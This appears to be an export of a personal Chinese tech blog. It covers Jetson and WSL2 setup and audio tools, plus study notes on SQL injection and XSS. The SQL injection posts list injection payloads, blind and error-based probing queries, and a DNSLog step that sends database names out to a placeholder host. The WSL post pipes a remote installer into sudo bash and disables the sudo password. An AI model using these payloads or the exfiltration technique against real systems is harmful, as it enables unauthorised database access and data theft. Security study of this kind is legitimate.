    <content><![CDATA[<p>包含系统烧录JetPack、Pytorch配置等<br>
我的设备为：Jetson Orin Nano 4GB</p>
<span id="more"></span>
<h2 id="进入恢复模式"><a class="markdownIt-Anchor" href="#进入恢复模式"></a> 进入恢复模式</h2>
<ol>
<li>拔出板子上的所有外接线材</li>
<li>找到 FC_REC 和 GND，将板子的接口一侧朝向自己，我的设备上它们位于上方的边缘处（在风扇的垂直下方）</li>
<li>将它们短接（推荐使用跳线帽）</li>
<li>用一根<strong>高质量</strong>的type-C线将Jetson与宿主机相连</li>
<li>插上电源</li>
<li>在宿主机上检查是否连接
<ul>
<li>宿主机为Windows：设备管理器中查找"APX"</li>
<li>宿主机为Linux：<code>lsusb</code>查找"APX"</li>
</ul>
</li>
</ol>
<h2 id="sdk-manager"><a class="markdownIt-Anchor" href="#sdk-manager"></a> SDK Manager</h2>
<p>我选择的安装方式为<a href="https://developer.nvidia.com/sdk-manager">SDK Manager</a></p>
<p>推荐使用VMware虚拟机安装Ubuntu，我使用WSL2和Docker都踩了很多坑，综合而言VMware虚拟机安装是最方便的<br>
安装的Ubuntu版本不可随意，这是部分对照表（截至2025-01-07）：</p>
<table>
<thead>
<tr>
<th>Ubuntu版本</th>
<th>JetPack版本</th>
</tr>
</thead>
<tbody>
<tr>
<td>2204/2404</td>
<td>6.1</td>
</tr>
<tr>
<td>2004/2204</td>
<td>6.0</td>
</tr>
<tr>
<td>1804/2004</td>
<td>5.1.4</td>
</tr>
<tr>
<td>1804/2004</td>
<td>5.1.3</td>
</tr>
<tr>
<td>1804/2004</td>
<td>5.1.2</td>
</tr>
</tbody>
</table>
<p>如果要安装较旧的版本，请使用<code>sdkmanager --archived-versions</code></p>
<p>安装时请不要挂机，注意报错，可能需要安装软件包，或者Jetson掉线<br>
对于Jetson连接问题：</p>
<ol>
<li>虚拟机设置中的USB设置，使用USB3.1标准</li>
<li>检查电脑的USB接口，优先使用其中的USB3.0及以上的接口</li>
<li>刷写过程中会频繁的掉线重连，请注意输出。有时候掉线后不会自动重连，注意VMware界面右下角，检查是否有"APX"，如果有，请点击它并将其连接到虚拟机</li>
</ol>
<h2 id="rtl8821ce驱动"><a class="markdownIt-Anchor" href="#rtl8821ce驱动"></a> RTL8821CE驱动</h2>
<p><code>git clone https://github.com/lwfinger/rtw88.git</code><br>
<code>cd rtw88</code><br>
<code>make</code><br>
<code>sudo make install</code></p>
<h2 id="配置pytorch必看"><a class="markdownIt-Anchor" href="#配置pytorch必看"></a> 配置Pytorch必看</h2>
<h3 id="如果要安装ultralytics"><a class="markdownIt-Anchor" href="#如果要安装ultralytics"></a> 如果要安装ultralytics</h3>
<p>请在安装Pytorch前安装它，否则它会认为你已有的pytorch不兼容而直接安装cpu版本的Pytorch和TorchVision</p>
<h3 id="jetson无法使用普通的pytorch"><a class="markdownIt-Anchor" href="#jetson无法使用普通的pytorch"></a> Jetson无法使用普通的Pytorch</h3>
<p>请查阅：<a href="https://docs.nvidia.com/deeplearning/frameworks/install-pytorch-jetson-platform/index.html">Nvidia官方的torch手册</a><br>
重点在这：<br>
<code>https://developer.download.nvidia.com/compute/redist/jp/v$JP_VERSION/pytorch/$PYT_VERSION</code></p>
<p>其中：<br>
JP_VERSION<br>
The major and minor version of JetPack you are using, such as 461 for JetPack 4.6.1 or 50 for JetPack 5.0.<br>
PYT_VERSION<br>
The released version of the PyTorch wheels, as given in the Compatibility Matrix</p>
<p>我建议先点进<a href="https://developer.download.nvidia.com/compute/redist/jp">这里看看</a></p>
<h3 id="import-torch提示缺少libcusparseltso0"><a class="markdownIt-Anchor" href="#import-torch提示缺少libcusparseltso0"></a> import torch提示缺少libcusparseLt.so.0</h3>
<p>请查阅：<a href="https://discuss.pytorch.org/t/importerror-libcusparselt-so-0-cannot-open-shared-object-file-no-such-file-or-directory/190061">Pytorch论坛上对于：ImportError: libcusparseLt.so.0: cannot open shared object file: No such file or directory的解决方案</a></p>
<h3 id="编译torchvision"><a class="markdownIt-Anchor" href="#编译torchvision"></a> 编译Torchvision</h3>
<p><a href="https://github.com/pytorch/vision/tree/v0.20.1">Torchivision官方仓库</a>，选择与自己Pytorch版本对应的，该仓库页有说明</p>
<p>下载完成解压后进入目录 安装依赖包</p>
<ol>
<li><code>sudo apt-get install libopenblas-base libopenmpi-dev</code></li>
<li>在虚拟环境下安装<code>pip install Cython</code></li>
<li>这里选择自己的版本<code>export BUILD_VERSION=0.13.0</code></li>
<li>编译过程很漫长 会报warning 但是不用介意<code>python setup.py install</code></li>
<li>等待编译完成</li>
</ol>
<h2 id="添加交换内存并设置为开机自动挂载"><a class="markdownIt-Anchor" href="#添加交换内存并设置为开机自动挂载"></a> 添加交换内存并设置为开机自动挂载</h2>
<p>Jetson的内存较小，经常会出现内存不足的情况。扩展交换内存可以减缓这一问题</p>
<ul>
<li>添加交换内存<br>
<code>sudo fallocate -l 8G /swapfile</code><br>
<code>sudo chmod 600 /swapfile</code><br>
<code>sudo mkswap /swapfile</code><br>
<code>sudo swapon /swapfile</code><br>
<code>free -h</code></li>
<li>开机挂载<br>
<code>sudo nano /etc/fstab</code><br>
<code>末尾添加：/swapfile none swap sw 0 0</code><br>
<code>sudo chmod 600 /swapfile</code><br>
<code>sudo mount -a</code><br>
<code>sudo swapon --all</code><br>
<code>swapon --show</code><br>
<code>free -h</code></li>
</ul>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux开发机配置</title>
    <url>/2024/01/26/14-43-28/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="03156300e11840044c28e8c0f1c4355f023b8ac5a59fe8a296abf83951cf5807"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-surge">
      <input class="hbe hbe-input-field hbe-input-field-surge" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-surge" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-surge" data-content="请输入密码.">请输入密码.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-surge" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M1200,9c0,0-305.005,0-401.001,0C733,9,675.327,4.969,598,4.969C514.994,4.969,449.336,9,400.333,9C299.666,9,0,9,0,9v43c0,0,299.666,0,400.333,0c49.002,0,114.66,3.484,197.667,3.484c77.327,0,135-3.484,200.999-3.484C894.995,52,1200,52,1200,52V9z"></path>
      </svg>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>环境</tag>
        <tag>zz</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入-1</title>
    <url>/2023/09/04/17-10-13/</url>
    <content><![CDATA[<h2 id="什么是sql注入有什么危害"><a class="markdownIt-Anchor" href="#什么是sql注入有什么危害"></a> 什么是SQL注入？有什么危害？</h2>
<p>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。从而导致数据库受损（被拖库、被删除、甚至整个服务器权限沦陷）。</p>
<span id="more"></span>
<img src="/images/posts/pPr0Urd.md.png" alt="SQL注入的过程示意图" onerror="this.onerror=null; this.src='https://s1.ax1x.com/2023/09/05/pPr0Urd.png'">
<p>对于前后端分离的架构，后端的服务器一般开放80端口（如Apache、Tomcat、IIS），并通过一些代码连接到后端数据库。</p>
<h2 id="如何构建可以执行的语句"><a class="markdownIt-Anchor" href="#如何构建可以执行的语句"></a> 如何构建可以执行的语句？</h2>
<p>需要知道<strong>元数据</strong>：库、表、字段、字段类型等等。</p>
<h3 id="如何获取元数据"><a class="markdownIt-Anchor" href="#如何获取元数据"></a> 如何获取元数据</h3>
<ul>
<li>获取数据库：<code>show databases</code></li>
<li>获取当前库的表：<code>use db;show tables</code></li>
<li>获取当前表的字段：<code>show columns from tbl_name</code></li>
<li>当前数据库：<code>select database()</code></li>
<li>当前表：<code>select tbl_name()</code></li>
<li>当前数据库版本：<code>select version()</code></li>
<li><strong>MySQL系统库</strong>：<strong>SCHEMATA</strong>中包含了所有的库名，<strong>TABLES</strong>中包含了所有表名,<strong>COLUMNS</strong>中包含了所有列名：</li>
</ul>
<pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">select SCHEMA_NAME from 'SCHEMATA';
select TABLE_NAME from `TABLES` where TABLE_SCHEMA='db_name';
select COLUMN_NAME from `COLUMNS` where TABLE_SCHEMA='db_name' and table_name='table_name';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="sql注入语句构建方式"><a class="markdownIt-Anchor" href="#sql注入语句构建方式"></a> SQL注入语句构建方式</h3>
<p>后端可能是将输入的参数与已有的语句进行拼接，然后进行查询。<br>
按照这个思路，其本质就是执行一段SQL语句（但php中一次仅能执行一条sql），只要以一定的方式构建语句，就能达到目的。<br>
有如下思路：</p>
<ol>
<li><code>';</code>：结束上句（闭合语句）。</li>
<li><code>#</code>、<code>--</code>、<code>--+</code>：注释下句，注意空格，<code>--+</code>是php的特例。</li>
<li><code>union</code>：将两条查询语句合并成一条来解决php限制。<br>
<strong>注意：union的参数数量要一致、对应序号的字段的类型要能够转换</strong></li>
<li><code>order by 1/2/3···</code>：探测字段数量。</li>
<li>在3的基础上添加相应的字段数。</li>
</ol>
<p>对于使用get来查询的网站：</p>
<ol>
<li>探查是否存在SQL注入漏洞<br>
注意注入的类型<br>
常见payload:</li>
</ol>
<pre class="line-numbers language-code" data-language="code"><code class="language-code">or 1=1--+
'or 1=1--+
"or 1=1--+
)or 1=1--+
')or 1=1--+
")or 1=1--+
"))or 1=1--+
1=1
1=2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ol>
<li>探查数据库指纹，交由工具执行</li>
<li>获取数据库名<br>
同上,组合技:1=1和order by</li>
<li>获取表名</li>
<li>获取列名</li>
<li>得到数据</li>
<li>一些整理：
<ul>
<li>多行数据变成一行：<code>select group_concat(table_name) from information_schema.tables where table_schema='xxx'</code>,注意要保证参数数量一致.</li>
<li>现在已知了所有参数,填充未知参数来获取数据.</li>
<li>如果有查询数量的限制,使用limit 0,1这样的方式来逐个查询.</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入-2</title>
    <url>/2023/09/04/19-17-32/</url>
    <content><![CDATA[<p>包含：</p>
<ul>
<li>SQL注入自动化工具</li>
<li>布尔盲注</li>
<li>基于时间的盲注</li>
<li>基于报错的注入</li>
<li>DNSLog注入</li>
</ul>
<span id="more"></span>
<h2 id="sql注入自动化工具sqlmap"><a class="markdownIt-Anchor" href="#sql注入自动化工具sqlmap"></a> SQL注入自动化工具–sqlmap</h2>
<p><a href="%22https://blog.csdn.net/smli_ng/article/details/106026901%22">相关参数和实例演示</a><br>
<a href="%22https://zhuanlan.zhihu.com/p/397917097">另一篇</a><br>
<strong>重要参数和方法</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>--level</code></td>
<td>payload级别, 越高payload越多</td>
</tr>
<tr>
<td><code>--risk</code></td>
<td>风险等级</td>
</tr>
<tr>
<td><code>--current-db</code></td>
<td>获取当前连接库名</td>
</tr>
<tr>
<td><code>--dbs</code></td>
<td>获取全部库名</td>
</tr>
<tr>
<td><code>--dbms</code></td>
<td>指定数据库类型, eg: dbms=mysql</td>
</tr>
<tr>
<td><code>-D</code></td>
<td>指定要查询的库, eg: -D “security”</td>
</tr>
<tr>
<td><code>--tables</code></td>
<td>查询所有表, eg: -D “security” --tables</td>
</tr>
<tr>
<td><code>-T</code></td>
<td>指定要查询的表</td>
</tr>
<tr>
<td><code>--col</code></td>
<td>获取所有列</td>
</tr>
<tr>
<td><code>-C</code></td>
<td>指定要查询的列, 可多选</td>
</tr>
<tr>
<td><code>--dump</code></td>
<td>导出为csv</td>
</tr>
<tr>
<td><code>-m</code></td>
<td>多网址注入, eg: -m “d:/urls.txt”</td>
</tr>
<tr>
<td><code>--batch</code></td>
<td>无人值守, 使用默认参数</td>
</tr>
</tbody>
</table>
<h2 id="布尔盲注"><a class="markdownIt-Anchor" href="#布尔盲注"></a> 布尔盲注</h2>
<p><strong>适用场景：没有数据回显，条件正确有结果，错误没结果。</strong><br>
利用方式：构造<em>判断条件（and）</em>，逐个猜测。</p>
<ol>
<li>当前数据库名字的长度，是不是1、2、3······</li>
<li>数据库的第一个字母是不是a、b、c······ (此处的实现可以用二分法来探查)</li>
<li>直到问出来数据库名</li>
<li>依此类推，推出表名等等</li>
</ol>
<p>相关的sql语句：</p>
<ol>
<li>截取字符
<ul>
<li><code>SELECT mid("abcdefg",5,5);</code> 第五位及其后面的一共五位字符。</li>
<li><code>SELECT substr("abcdefg",5,5);</code> 同上。</li>
<li><code>SELECT left("abcdefg",5);</code> 从左边开始截取五位。</li>
<li><code>SELECT right("abcdefg",5);</code> 从右边开始截取五位。</li>
</ul>
</li>
<li>转成ascii码（便于脚本实现）
<ul>
<li><code>SELECT ORD('a');</code> 转换为ascii码。</li>
<li><code>SELECT ASCII('a');</code> 同上。</li>
</ul>
</li>
<li>正则匹配
<ul>
<li><code>SELECT table_name() regexp '^ro';</code> 转换为ascii码。</li>
<li><code>SELECT table_name() like '^ro%';</code> 转换为ascii码。</li>
</ul>
</li>
</ol>
<h2 id="基于时间的盲注"><a class="markdownIt-Anchor" href="#基于时间的盲注"></a> 基于时间的盲注</h2>
<p><strong>适用场景：没有数据回显，无论条件正确与否结果一样。</strong><br>
利用方式：构造条件（and），添加<em>sleep</em>，逐个猜测。</p>
<p>相关sql语句：</p>
<ol>
<li><code>SELECT if((1=2),1,3);</code> 相当于三目运算符 <code>? :</code>。</li>
<li><code>SELECT sleep(1);</code> 睡眠，单位：秒。</li>
<li>组合上述两者，可以用时间的区别来进行注入。eg：<code>select if(length(database())=2,0,sleep(1))</code>，是就没反应，否就沉默。</li>
</ol>
<h2 id="基于报错的注入"><a class="markdownIt-Anchor" href="#基于报错的注入"></a> 基于报错的注入</h2>
<p><strong>适用场景：没有数据回显，无论条件正确与否结果一样，sleep没区别，但是错误信息会打印出来。</strong><br>
利用方式：利用<em>语法错误</em>，把value在前端输出。</p>
<p>相关sql语句：</p>
<ol>
<li><code>SELECT extractValue('&lt;a&gt;&lt;b&gt;&lt;/b&gt;&lt;/a&gt;','/a/b');</code> 从XML节点中查找结点</li>
<li>这些是正确的，我们要写错误的，这样才能报出错误</li>
</ol>
<pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">SELECT updateXML('&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;','/a','&lt;e&gt;fff&lt;/e&gt;') AS val1,
SELECT updateXML('&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;','/b','&lt;e&gt;fff&lt;/e&gt;') AS val2,
SELECT updateXML('&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;','//b','&lt;e&gt;fff&lt;/e&gt;') AS val3,
SELECT updateXML('&lt;a&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;','/a/d','&lt;e&gt;fff&lt;/e&gt;') AS val4,
SELECT updateXML('&lt;a&gt;&lt;d&gt;&lt;/d&gt;&lt;b&gt;ccc&lt;/b&gt;&lt;d&gt;&lt;/d&gt;&lt;/a&gt;','/a/d','&lt;e&gt;fff&lt;/e&gt;') AS val5;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="todo"><a class="markdownIt-Anchor" href="#todo"></a> TODO</h2>
<p>添加报错注入的语句</p>
<h2 id="dnslog注入"><a class="markdownIt-Anchor" href="#dnslog注入"></a> DNSLog注入</h2>
<p><strong>适用场景：没有数据回显，没有SSRF，但是能够发送DNS请求。(Windows系统)</strong><br>
利用方式：通过DNSlog方式将想获得的数据外带出来（oob）。</p>
<img src="/images/posts/pPc0iP1.md.png" alt="DNSLog注入流程" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/09/10/pPc0iP1.png'">
<h3 id="mysql读写函数"><a class="markdownIt-Anchor" href="#mysql读写函数"></a> MySQL读写函数</h3>
<h4 id="读select-load_filepath"><a class="markdownIt-Anchor" href="#读select-load_filepath"></a> 读：<em>select LOAD_FILE(‘path’)</em></h4>
<p>有如下限制：</p>
<ul>
<li>只能访问本机的文件</li>
<li>文件需要有读取权限</li>
<li>字节数小于max_allowed_packet</li>
</ul>
<p>相关配置文件：在my.ini中有参数secure_file_priv，其配置值为：</p>
<table>
<thead>
<tr>
<th>配置值</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>指定文件夹</td>
<td>导入导出只能在指定的文件夹</td>
</tr>
<tr>
<td>不设置</td>
<td>不允许执行</td>
</tr>
<tr>
<td>null</td>
<td>没有任何限制</td>
</tr>
<tr>
<td>修改此参数后需要重启mysql生效</td>
<td></td>
</tr>
</tbody>
</table>
<h4 id="写select-xxx-into-outfile-path"><a class="markdownIt-Anchor" href="#写select-xxx-into-outfile-path"></a> 写：<em>select xxx INTO OUTFILE ‘path’</em></h4>
<h3 id="dnslog注入流程"><a class="markdownIt-Anchor" href="#dnslog注入流程"></a> DNSLog注入流程</h3>
<ol>
<li>把select LOAD_FILE()注入到数据库</li>
<li>UNC构建DNS服务器地址，假装访问文件，产生DNSLog<br>
<code>select load_file('////aaa.xxx.dnslog.xxx/abc');</code></li>
<li>把子域名替换为函数或者查询SQL<br>
<code>select if ((select load_file(concat('////',database(),'.xxx.dnslog.xxx/abc'))),1,0);</code></li>
</ol>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>渗透</tag>
        <tag>SQLMap</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL注入-3</title>
    <url>/2023/09/08/18-45-32/</url>
    <content><![CDATA[<p>包含：</p>
<ul>
<li>SQL注入的防御</li>
<li>WAF类型及安装</li>
<li>WAF绕过思路</li>
</ul>
<span id="more"></span>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>SqlServer安装踩坑</title>
    <url>/2023/09/05/11-13-02/</url>
    <content><![CDATA[<p>SqlServer难装的一笔，在此提供一些解决方案、提示，以及有用方案的网址导航。</p>
<span id="more"></span>
<ol start="0">
<li><a href="https://blog.csdn.net/m0_63324772/article/details/129767907">看看这个能不能行</a></li>
<li>使用CCleaner清理注册表</li>
<li><a href="https://www.jianshu.com/p/b99b1907d848">SQL Server开启1433端口，彻底解决方案</a></li>
</ol>
<h2 id="拉倒吧咋咋不行"><a class="markdownIt-Anchor" href="#拉倒吧咋咋不行"></a> 拉倒吧，咋咋不行</h2>
<p>装2017一下子就完事了<br>
回头试试装虚拟机里或者是docker安装。</p>
]]></content>
      <categories>
        <category>安装踩坑</category>
      </categories>
      <tags>
        <tag>SqlServer</tag>
        <tag>踩坑</tag>
      </tags>
  </entry>
  <entry>
    <title>TODO-List</title>
    <url>/9999/12/31/15-59-59/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="56009e9d1c24d023a1f5c18dbda39ac8f82d11abcc93e901f25a13f4c7466274"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-surge">
      <input class="hbe hbe-input-field hbe-input-field-surge" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-surge" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-surge" data-content="请输入密码.">请输入密码.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-surge" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M1200,9c0,0-305.005,0-401.001,0C733,9,675.327,4.969,598,4.969C514.994,4.969,449.336,9,400.333,9C299.666,9,0,9,0,9v43c0,0,299.666,0,400.333,0c49.002,0,114.66,3.484,197.667,3.484c77.327,0,135-3.484,200.999-3.484C894.995,52,1200,52,1200,52V9z"></path>
      </svg>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>zz</tag>
        <tag>Todo</tag>
      </tags>
  </entry>
  <entry>
    <title>UVR5分离人声一条龙</title>
    <url>/2023/11/11/03-04-36/</url>
    <content><![CDATA[<p>多数情况下通用的UVR5处理歌曲的流程</p>
<span id="more"></span>
<h2 id="初步分离人声和伴奏"><a class="markdownIt-Anchor" href="#初步分离人声和伴奏"></a> 初步分离人声和伴奏</h2>
<p>MDX-Net–&gt;MDX23C-InstVoc HQ<br>
提取出人声（夹带没去干净的伴奏和和声）、伴奏</p>
<h2 id="分离和声和干声"><a class="markdownIt-Anchor" href="#分离和声和干声"></a> 分离和声和干声</h2>
<p>VR Architecture–&gt;6_HP-Karaoke-UVR<br>
在上面提取出的没有去除干净的音频的基础上再次提取<br>
得到干声以及和声（带和声干声没用了，可以删了）</p>
<h2 id="减少干声混响"><a class="markdownIt-Anchor" href="#减少干声混响"></a> 减少干声混响</h2>
<p>VR Architecture–&gt;UVR-De-Echo-Normol<br>
在干声的基础上减少混响等效果，得到纯净的人声，选择No Echo Only。</p>
<h2 id="减少干声底噪"><a class="markdownIt-Anchor" href="#减少干声底噪"></a> 减少干声底噪</h2>
<p>VR Architecture–&gt;UVR-DeNoise<br>
在上面减少混响的基础上继续降噪，选择No Noise Only，得到最终的干声。</p>
]]></content>
      <categories>
        <category>音频处理</category>
      </categories>
      <tags>
        <tag>UVR5</tag>
        <tag>音频处理</tag>
      </tags>
  </entry>
  <entry>
    <title>WSL2系统配置</title>
    <url>/2025/01/04/14-33-33/</url>
    <content><![CDATA[<p>WSL2系统配置步骤<br>
包含：版本选择、sudo免密码、zsh、换源、miniconda</p>
<span id="more"></span>
<h2 id="下载安装相应的版本"><a class="markdownIt-Anchor" href="#下载安装相应的版本"></a> 下载安装相应的版本</h2>
<ol>
<li>从官方商店选择<code>wsl --list --online</code></li>
<li>安装相关的版本<code>wsl --install -d xxx</code></li>
<li>设置为默认启动发行版<code>wsl --set-default xxx</code></li>
</ol>
<h2 id="迁移到其他位置"><a class="markdownIt-Anchor" href="#迁移到其他位置"></a> 迁移到其他位置</h2>
<ol>
<li>确认wsl子系统关闭<code>wsl --shutdown</code></li>
<li>导出到指定位置<code>wsl --export xxx E:\xxx.tar</code></li>
<li>注销希望迁移的linux系统<code>wsl --unregister xxx</code></li>
<li>导入系统<code>wsl --import Ubuntu E:\Ubuntu\ E:\Ubuntu\ubuntu.tar --version 2</code></li>
</ol>
<h2 id="sudo省略输入密码配置"><a class="markdownIt-Anchor" href="#sudo省略输入密码配置"></a> sudo省略输入密码配置</h2>
<ol>
<li><code>sudo visudo</code></li>
<li>添加行<code>xxx ALL=(ALL) NOPASSWD: ALL</code>，xxx为实际用户名</li>
</ol>
<h2 id="zsh配置"><a class="markdownIt-Anchor" href="#zsh配置"></a> zsh配置</h2>
<p>推荐文章：<a href="https://www.haoyep.com/posts/zsh-config-oh-my-zsh/">https://www.haoyep.com/posts/zsh-config-oh-my-zsh/</a></p>
<h2 id="切换ustc源"><a class="markdownIt-Anchor" href="#切换ustc源"></a> 切换USTC源</h2>
<p>修改/etc/apt/sources.list.d/ubuntu.sources</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Types: deb
URIs: https://mirrors.ustc.edu.cn/ubuntu
Suites: noble noble-updates noble-backports
Components: main restricted universe multiverse
Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg

Types: deb
URIs: https://mirrors.ustc.edu.cn/ubuntu
Suites: noble-security
Components: main restricted universe multiverse
Signed-By: /usr/share/keyrings/ubuntu-archive-keyring.gpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="安装miniconda3"><a class="markdownIt-Anchor" href="#安装miniconda3"></a> 安装miniconda3</h2>
<p><code>curl -L -O "https://github.com/conda-forge/miniforge/releases/latest/download/Miniforge3-$(uname)-$(uname -m).sh"</code><br>
<code>bash Miniforge3-$(uname)-$(uname -m).sh</code><br>
<code>conda init</code><br>
<code>conda config --show channel_priority</code><br>
<code>conda config --set channel_priority flexible</code></p>
<h2 id="安装nvidia-rapids"><a class="markdownIt-Anchor" href="#安装nvidia-rapids"></a> 安装nvidia-Rapids</h2>
<p>官方安装文档<a href="https://docs.rapids.ai/install/#wsl2-conda">https://docs.rapids.ai/install/#wsl2-conda</a><br>
记住安装后根据CUDA版本选择：</p>
<ul>
<li>For CUDA 11, run:    conda install cudatoolkit cuda-version=11</li>
<li>For CUDA 12, run:    conda install cuda-cudart cuda-version=12</li>
</ul>
<h2 id="编译内核"><a class="markdownIt-Anchor" href="#编译内核"></a> 编译内核</h2>
<p>参考：<a href="https://blog.csdn.net/weixin_43408232/article/details/129960452">https://blog.csdn.net/weixin_43408232/article/details/129960452</a></p>
<ol>
<li>安装依赖<code>sudo apt install build-essential flex bison dwarves libssl-dev libelf-dev flex bison bc</code></li>
<li>从微软的wsl2内核仓库<a href="https://github.com/microsoft/WSL2-Linux-Kernel/releases">https://github.com/microsoft/WSL2-Linux-Kernel/releases</a>下载需要的版本</li>
<li>解压并进入</li>
<li>编译<code>sudo make KCONFIG_CONFIG=Microsoft/config-wsl -j4</code>，根据自己的cpu和内存选择-jn</li>
<li>新的内核位于arch/x86/boot/bzImage</li>
<li>复制内核到Windows<code>cp arch/x86/boot/bzImage  /mnt/d</code>，并将其重命名为kernel</li>
<li>关闭wsl<code>wsl --shutdown</code></li>
<li>找到原来的内核位置，通常在C:\Windows\System32\lxss\tools</li>
<li>替换重启</li>
<li>安装内核模块<code>make modules_install</code></li>
</ol>
<p>其中步骤6到8也可以这样：<br>
找到Windows用户目录下的.wslconfig文件。修改其中kernel为指定的kernel路径即可，而不用替换</p>
<h2 id="绑定usb设备到wsl"><a class="markdownIt-Anchor" href="#绑定usb设备到wsl"></a> 绑定usb设备到wsl</h2>
<p>参考：<a href="https://learn.microsoft.com/zh-cn/windows/wsl/connect-usb">https://learn.microsoft.com/zh-cn/windows/wsl/connect-usb</a><br>
wsl中需要先<code>sudo modprobe vhci_hcd</code></p>
<ol>
<li>安装usbipd-win<code>winget install --interactive --exact dorssel.usbipd-win</code></li>
</ol>
<h2 id="zerotier组网"><a class="markdownIt-Anchor" href="#zerotier组网"></a> Zerotier组网</h2>
<p>使用Zerotier搭建局域网，<a href="https://www.zerotier.com/download/">Zerotier官网</a></p>
<p>我的Planet配置文件：<a href="http://146.56.239.221:3180/planet">http://146.56.239.221:3180/planet</a></p>
<ol>
<li>安装zerotier<code>curl -s https://install.zerotier.com | sudo bash</code></li>
<li>安装完成后，到<code>/var/lib/zerotier-one</code>目录，将其中Planet文件替换为我给的</li>
<li>重启Zerotier服务<code>sudo systemctl restart zerotier-one</code></li>
<li>连接到我的网络<code>sudo zerotier-cli join 264ff56c52d4e471</code></li>
<li>输入后通知我，我在后台授予权限</li>
</ol>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS注入-1</title>
    <url>/2023/09/10/06-13-26/</url>
    <content><![CDATA[<p>包含：</p>
<ul>
<li>无状态的HTTP</li>
<li>Cookie和Session</li>
<li>什么是XSS</li>
<li>XSS的防御</li>
</ul>
<span id="more"></span>
<h2 id="无状态的http"><a class="markdownIt-Anchor" href="#无状态的http"></a> 无状态的HTTP</h2>
<img src="/images/posts/pPcrgeS.md.png" alt="HTTP请求方式" onerror="this.onerror=null; this.src='https://s1.ax1x.com/2023/09/10/pPcrgeS.png'">
<img src="/images/posts/pPcsuOf.md.png" alt="HTTP请求格式" onerror="this.onerror=null; this.src='https://s1.ax1x.com/2023/09/10/pPcsuOf.png'">
<img src="/images/posts/pPcslTg.png" alt="HTTP响应格式" onerror="this.onerror=null; this.src='https://s1.ax1x.com/2023/09/10/pPcslTg.png'">
<h3 id="http特点"><a class="markdownIt-Anchor" href="#http特点"></a> HTTP特点</h3>
<ul>
<li>请求应答模式（http1.1及以前，2.0下服务器可以向客户端push）</li>
<li>灵活可扩展</li>
<li>可靠传输（基于tcpip）</li>
<li>无状态</li>
</ul>
<h3 id="cookie和session"><a class="markdownIt-Anchor" href="#cookie和session"></a> Cookie和Session</h3>
<h4 id="cookie"><a class="markdownIt-Anchor" href="#cookie"></a> Cookie</h4>
<p><img src="https://s1.ax1x.com/2023/09/10/pPcLxyV.png" alt="Cookie产生"><br>
Cookie特点：</p>
<ul>
<li>明文</li>
<li>可修改</li>
<li>大小受限（视浏览器而定）</li>
</ul>
<p>Cookie用途：</p>
<ul>
<li>记住登陆状态</li>
<li>跟踪用户行为</li>
</ul>
